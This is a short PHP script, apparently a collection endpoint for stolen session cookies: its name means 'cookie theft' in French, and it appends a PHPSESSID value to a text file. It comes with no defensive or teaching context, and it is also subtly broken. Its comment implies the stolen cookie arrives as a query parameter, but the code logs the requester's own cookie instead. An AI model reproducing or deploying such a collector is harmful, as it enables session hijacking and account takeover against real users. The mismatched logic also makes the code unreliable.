<?php
// vol_cookie.php?cookie=abc
$cookie = $_COOKIE['PHPSESSID'];
file_put_contents('cookies_2.txt', $cookie."\n", FILE_APPEND);
?>